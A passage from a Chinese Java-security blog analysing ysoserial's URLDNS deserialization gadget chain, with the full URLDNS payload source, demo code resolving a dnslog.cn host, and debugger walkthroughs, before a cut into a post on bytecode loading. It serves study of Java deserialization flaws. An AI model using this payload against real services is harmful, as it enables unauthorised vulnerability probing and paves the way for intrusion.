&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210314212.png"
                      alt="image-20230626210314212"
                ></p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p><code>URLDNS</code>是ysoserial中一条利用链的名字。</p>
<ul>
<li>在java反序列化中存在一个不可绕过的工具：ysoserial。它可以让⽤户根据自己选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从而执⾏⽤户预先定义的命令。</li>
<li>利⽤链也叫“gadget chains”，我们通常称为gadget。我们的代码一环扣一环完整运行下来便可以理解成一个链条。</li>
</ul>
<p>通常情况下利用链是可以执行任意命令的，<code>URLDNS</code>却仅仅能发送一次DNS请求。但由于其有如下优点：</p>
<ul>
<li>使用Java内置的类构造，对第三⽅库没有依赖</li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h3 id="URLDNS成因"><a href="#URLDNS成因" class="headerlink" title="URLDNS成因"></a>URLDNS成因</h3><p>URLDNS的成因主要是 <code>java.net.URL</code>类在进行<code>equals</code>和<code>hashcode</code>时，会调用<code>java.net.InetAdderss</code>类的<code>getByName</code>方法进行dns查询。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        URL a=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://0yyeip.dnslog.cn&quot;</span>);</span><br><span class="line">        URL b=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://0yyeip.dnslog.cn&quot;</span>);</span><br><span class="line">        a.equals(b);</span><br><span class="line">        URL c=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://0yyeip.dnslog.cn&quot;</span>);</span><br><span class="line">        c.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210429945.png"
                      alt="image-20230626210429945"
                ></p>
<h4 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h4><p>在<code>equals</code>处下断点，简单跟一下流程。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210510048.png"
                      alt="image-20230626210510048"
                ></p>
<p>当调用<code>equals</code>时，实际上是调用<code>URLStreamHandler</code>的<code>equals</code>方法，跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210547110.png"
                      alt="image-20230626210547110"
                ></p>
<p>可以看到返回一个逻辑与的判断，当为1时<code>equals</code>成立。在这里逻辑判断的结果取决于<code>sameFile()</code>方法，跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210608423.png"
                      alt="image-20230626210608423"
                ></p>
<p>400行-415行分别是对u1和u2两个URL对象的属性进行了对比。</p>
<p>Java官方文档写道：如果<strong>两个主机名都可以解析为相同的IP地址</strong>，则认为两个主机是等效的</p>
<p><a class="link"   href="https://docs.oracle.com/javase/7/docs/api/java/net/URL.html#equals(java.lang.Object)" >https://docs.oracle.com/javase/7/docs/api/java/net/URL.html#equals(java.lang.Object)<i class="fas fa-external-link-alt"></i></a></p>
<p>因此，在418行<code>hostsEqual</code>针对两个地址解析<code>hosts</code>进行比较。跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210652472.png"
                      alt="image-20230626210652472"
                ></p>
<p>在这里执行了<code>getHostAddress</code>方法，该方法便是通过调用<code>java.net.InetAdderss</code>类的<code>getByName</code>方法发起dns请求来获取URL对应的ip地址。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210711152.png"
                      alt="image-20230626210711152"
                ></p>
<p>看一下<code>InetAddres.getByName</code>:</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210731474.png"
                      alt="image-20230626210731474"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210754338.png"
                      alt="image-20230626210754338"
                ></p>
<h4 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h4><p><code>hashcode</code>处下断点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210820921.png"
                      alt="image-20230626210820921"
                ></p>
<p>发现调用的是<code>URLStreamHandler</code>的<code>hashcode</code>方法。跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210835120.png"
                      alt="image-20230626210835120"
                ></p>
<p>发现在359行处调用了<code>getHostAddress</code>方法，再通过调用<code>java.net.InetAdderss</code>类的<code>getByName</code>方法发起dns请求来获取URL对应的ip地址。</p>
<h3 id="URLDNS分析"><a href="#URLDNS分析" class="headerlink" title="URLDNS分析"></a>URLDNS分析</h3><p>首先看看<code>URLDNS</code>是如何生成的</p>
<p><a class="link"   href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" >https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>URLDNS.java</code>中有<code>main</code>函数，这是为了方便对其单独调试。我们可以运行主函数，查看其如何产生相应的payload。</p>
<p>跟进<code>PayloadRunner.run()</code>;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// ensure payload generation doesn&#x27;t throw an exception</span></span><br><span class="line">    <span class="type">byte</span>[] serialized = <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;<span class="type">byte</span>[]&gt;()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="literal">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">            Utils.releasePayload(payload, objBefore);</span><br><span class="line">            <span class="keyword">return</span> ser;</span><br><span class="line">    &#125;&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objAfter</span> <span class="operator">=</span> Deserializer.deserialize(serialized);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>run</code>方法首先获取了序列化之后的数据<code>serialized</code>，之后又将其反序列化。</p>
<p>由于我们是直接运行的<code>main</code>方法，因此<code>command</code>的值是从<code>getDefaultTestCmd()</code>获取的。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230711234257880.png"
                      alt="image-20230711234257880"
                ></p>
<p>而<code>getDefaultTestCmd()</code>调用<code>getFirstExistingFile()</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210945339.png"
                      alt="image-20230626210945339"
                ></p>
<p>可以看到其返回的为<code>calc.exe</code>，但前面提到<code>URLDNS</code>仅仅能发起DNS请求，无法命令执行。因此这里需要稍作更改，更改为DNS地址。例如：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210959944.png"
                      alt="image-20230626210959944"
                ></p>
<p>回到<code>run</code>方法，获取到参数之后，程序会将<code>URLDNS</code>类实例化，并调用<code>getObject()</code>方法。</p>
<p>看一下<code>URLDNS.getObject()</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>首先创建<code>URLStreamHandler</code>，前面提到了：<code>hashcode</code>和<code>equals</code>实际上都是调用了<code>URLStreamHandler</code>里的方法。这里的<code>handler</code>是特地自定义的继承<code>URLStreamHandler</code>的类。具体为什么这么做，后面分析。</p>
<p>之后创建<code>HashMap</code>和<code>URL</code>，并调用<code>HashMap.put</code>。跟一下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211026218.png"
                      alt="image-20230626211026218"
                ></p>
<p>可以看到里面有<code>hash(key)</code>，其会变成<code>key.hashcode</code>。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211049531.png"
                      alt="image-20230626211049531"
                ></p>
<p>而这里的<code>key</code>往上追溯的话会发现就是根据<code>command</code>创建的<code>URL</code>。这里对应上了<code>URLDNS成因</code>里的<code>hashcode</code>，意味着在这里会发生一次DNS请求。</p>
<p>回到<code>getObject()</code>，<code>HashMap.put</code>完之后将<code>URL</code>的<code>hashcode</code>置为-1，具体原因后面说。最后返回<code>HashMap</code>。</p>
<p>回到<code>PayloadRunner.run()</code>，返回的<code>HashMap</code>会被序列化。</p>
<p>接下来看反序列化部分。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line">           <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objAfter</span> <span class="operator">=</span> Deserializer.deserialize(serialized);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>前面我们提到，反序列化时会调用对象的<code>readObject</code>方法。去看一下<code>HashMap.readObject()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到最后一行存在<code>hash(key)</code>操作，这里的<code>key</code>是从<code>HashMap</code>中取出来的，也就是<code>URL</code>。后面当然也同样对应上了<code>URLDNS成因</code>里的<code>hashcode</code>，意味着在这里也会发生一次DNS请求。</p>
<p>但是经过尝试我们会发现，在整个序列化和反序列化的过程中，仅仅发生了一次DNS请求。这里就和前面特地用继承<code>URLStreamHandler</code>的类有关了。</p>
<p>序列化时用到的<code>URLStreamHandler</code>类为<code>SilentURLStreamHandler</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>当序列化时，会调用<code>URL.hashcode()</code>，从而调用<code>URLStreamHandler.hashcode()</code>，然后调用<code>URLStreamHandler.getHostAddress()</code>，这里被替换成了<code>SilentURLStreamHandler.getHostAddress()</code>自然不会继续往下发起DNS请求，但这不是必须的，即使发生两次DNS请求，也可以确认存在反序列化（本地测试时发现，使用<code>URLStreamHandler</code>同样也是只有一次DNS请求，经过debug发现由于序列化和反序列化在同一环境下，反序列化时直接从cache中获的address，并未真正的发起DNS请求）。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211119971.png"
                      alt="image-20230626211119971"
                ></p>
<p>这里有个需要注意的点：<code>SilentURLStreamHandler</code>是我们自定义的类，在反序列化的时候系统中是没有这个类的，那么他是如何成功反序列化的？并且反序列化时如果调用<code>SilentURLStreamHandler</code>，那岂不是也没有DNS请求？</p>
<p>关于这两个问题：在<code>URL</code>类中<code>URLStreamHandler</code>是被transient修饰的，其并不参与序列化。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211131523.png"
                      alt="image-20230626211131523"
                ></p>
<p>当反序列化时，会重新创建<code>URLStreamHandler</code>类，以便正常使用其功能。</p>
<p>最后一个问题，序列化时为什么<code>HashMap.put</code>完之后将<code>URL</code>的<code>hashcode</code>置为-1。</p>
<p>这个就要看一下<code>URL.hashcode</code>了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211155675.png"
                      alt="image-20230626211155675"
                ></p>
<p>由于我们在序列化时已经进行过<code>hashcode</code>了，只有将其置为-1，在反序列化时其才会再次触发。</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java字节码的动态加载</title>
    <url>/2023/08/13/Java%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="什么是Java字节码？"><a href="#什么是Java字节码？" class="headerlink" title="什么是Java字节码？"></a>什么是Java字节码？</h2><p>Java作为一门跨平台开发语言。其跨平台的特性与自身独特的JVM（Java Virtual Machine）机制相关。而字节码，便是一种可以被Java虚拟器加载和执行的指令。</p>
<p>使用javac命令可以将.java文件编译为字节码文件，以.class做后缀。</p>
<p>除了Java之外，Scala、Groovyc、Kotlin等语言均可被编译器编译为字节码文件（.class），从而被JVM识别执行。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1659050135411-8ee0b254-39b0-4a46-87db-932e25cb1f06.png"
                      alt="image.png"
                ></p>
<h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><p>字节码文件经过JVM中ClassLoader的加载，在内存中生成Class类对象</p>
<blockquote>
<p>ClassLoader就是一个“加载器”，告诉Java虚拟机如何加载这个类。</p>
</blockquote>
<p>在Java中进行类加载时会调用三个方法：<code>ClassLoader#loadClass()</code>、<code>ClassLoader#findClass()</code>、<code>ClassLoader#defineClass()</code></p>
<ul>
<li>loadClass：从已加载的类缓存、父加载器等位置寻找类（采用双亲委派机制）</li>
<li>findClass：根据名称或位置加载.class字节码</li>
<li>defineClass：把字节码转换成Class类对象</li>
</ul>
<p>详细的类加载机制和双亲委派可参考：<a class="link"   href="https://www.cnblogs.com/hollischuang/p/14260801.html" >https://www.cnblogs.com/hollischuang/p/14260801.html<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="ClassLoader加载字节码文件"><a href="#ClassLoader加载字节码文件" class="headerlink" title="ClassLoader加载字节码文件"></a>ClassLoader加载字节码文件</h3><p>这里我们尝试创建一个自定义ClassLoader来加载本地的字节码文件：</p>
